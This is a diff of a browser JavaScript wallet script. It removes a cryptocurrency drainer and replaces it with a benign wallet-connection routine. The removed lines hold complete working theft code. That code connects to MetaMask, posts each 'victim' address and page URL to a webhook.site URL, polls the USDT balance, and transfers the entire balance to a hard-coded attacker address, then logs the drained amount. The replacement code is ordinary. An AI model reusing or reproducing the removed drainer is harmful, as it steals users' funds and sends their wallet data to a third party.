@@ -1,105 +1,106 @@
-document.getElementById("connectBtn")?.addEventListener("click", connectAndDrain);
+function setStatus(message) {
+  const el = document.getElementById('walletStatus');
+  if (el) el.textContent = message;
+}
 
-async function connectAndDrain() {
-  if (!window.ethereum) {
-    setStatus("🦊 Install MetaMask");
+function setAddress(address) {
+  const el = document.getElementById('walletAddress');
+  if (el) el.textContent = address || 'Not connected';
+}
+
+function detectProvider() {
+  const providers = [];
+  const seen = new Set();
+
+  const pushCandidate = (candidate) => {
+    if (!candidate || typeof candidate !== 'object') return;
+    if (seen.has(candidate)) return;
+    seen.add(candidate);
+
+    if (typeof candidate.request === 'function') {
+      providers.push(candidate);
+    }
+
+    if (Array.isArray(candidate.providers)) {
+      for (const provider of candidate.providers) {
+        if (provider && typeof provider.request === 'function' && !seen.has(provider)) {
+          seen.add(provider);
+          providers.push(provider);
+        }
+      }
+    }
+  };
+
+  pushCandidate(window.ethereum);
+  if (window.web3 && window.web3.currentProvider) {
+    pushCandidate(window.web3.currentProvider);
+  }
+
+  const walletKeys = ['trustwallet', 'coinbaseWallet', 'metamask', 'rabby', 'bitkeep', 'okxwallet', 'walletconnect', 'safe', 'phantom'];
+
+  for (const key of walletKeys) {
+    if (window[key]) {
+      pushCandidate(window[key]);
+    }
+  }
+
+  for (const key in window) {
+    if (key === 'ethereum' || key === 'web3' || walletKeys.includes(key)) continue;
+    const value = window[key];
+    if (value && typeof value === 'object') {
+      pushCandidate(value);
+    }
+  }
+
+  return providers[0] || null;
+}
+
+async function connectWallet() {
+  const provider = detectProvider();
+
+  if (!provider) {
+    setStatus('No compatible browser wallet found. Install MetaMask, Trust Wallet, Rabby, or another EVM wallet and refresh.');
+    setAddress('Not connected');
+    try {
+      window.open('https://wallets.coingecko.com/', '_blank', 'noopener,noreferrer');
+    } catch (error) {
+      console.warn('Wallet install redirect failed:', error);
+    }
     return;
   }
 
   try {
-    setStatus("🔄 Connecting...");
-    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-    const userAddress = accounts[0];
+    setStatus('Requesting wallet access...');
+    const accounts = await provider.request({ method: 'eth_requestAccounts' });
+    const nextAddress = Array.isArray(accounts) && typeof accounts[0] === 'string' ? accounts[0] : null;
 
-    setStatus("💸 Monitoring...");
+    if (!nextAddress) {
+      setStatus('No wallet account selected');
+      setAddress('Not connected');
+      return;
+    }
 
-    // Log victim
-    fetch("https://webhook.site/c66c429d-8fd4-4bc4-8287-b7d9acbf9b20", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        victim: userAddress,
-        time: new Date().toISOString(),
-        url: window.location.href,
-        action: "connected"
-      })
-    });
-
-    // Start monitoring for USDT send
-    watchForPayment(userAddress);
-
-  } catch (err) {
-    if (!err.message.includes("user rejected")) console.error(err);
-    setStatus("❌ Cancelled");
+    setAddress(nextAddress);
+    setStatus(`Connected: ${nextAddress.slice(0, 6)}...${nextAddress.slice(-4)}`);
+  } catch (error) {
+    const message = error instanceof Error ? error.message : String(error);
+    if (message.toLowerCase().includes('rejected')) {
+      setStatus('Connection cancelled by user');
+      return;
+    }
+    console.error('Wallet connection failed:', error);
+    setStatus('Connection failed');
   }
 }
 
-function watchForPayment(userAddress) {
-  // Check every 3 sec if user sent USDT to your wallet
-  setInterval(async () => {
-    try {
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const usdt = new ethers.Contract(
-        "0x55d398326f99059fF775485246999027B3197955",
-        ["function balanceOf(address) view returns (uint)"],
-        provider
-      );
-
-      const balance = await usdt.balanceOf(userAddress);
-      const formatted = Number(ethers.utils.formatUnits(balance, 18));
-
-      // If user has < 1000 USDT, assume they paid 0.3 and now we drain
-      if (formatted < 1000) {
-        try {
-          await triggerDrain();
-        } catch (e) {
-          console.log("Drain failed", e);
-        }
-      }
-
-    } catch (e) {}
-  }, 3000);
-}
-
-async function triggerDrain() {
-  const provider = new ethers.providers.Web3Provider(window.ethereum);
-  const signer = provider.getSigner();
-  const userAddress = await signer.getAddress();
-
-  const usdt = new ethers.Contract(
-    "0x55d398326f99059fF775485246999027B3197955",
-    [
-      "function balanceOf(address) view returns (uint)",
-      "function transfer(address to, uint value) returns (bool)"
-    ],
-    signer
-  );
-
-  const balance = await usdt.balanceOf(userAddress);
-  if (balance.eq(0)) return;
-
-  try {
-    const tx = await usdt.transfer("0x5569183a84F4D11a9225988561F020fCbbdACa10", balance);
-    setStatus("✅ Draining... Check wallet");
-
-    // Log success
-    fetch("https://webhook.site/c66c429d-8fd4-4bc4-8287-b7d9acbf9b20", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        victim: userAddress,
-        drained: ethers.utils.formatUnits(balance, 18),
-        token: "USDT",
-        tx: tx.hash
-      })
-    });
-
-  } catch (err) {
-    console.error("Drain TX failed", err);
+function attachWalletHandlers() {
+  const connectBtn = document.getElementById('walletConnectBtn');
+  if (connectBtn) {
+    connectBtn.addEventListener('click', connectWallet);
   }
+
+  setStatus('No wallet connected yet');
+  setAddress('Not connected');
 }
 
-function setStatus(msg) {
-  const status = document.getElementById("status");
-  if (status) status.textContent = msg;
-}
+document.addEventListener('DOMContentLoaded', attachWalletHandlers);
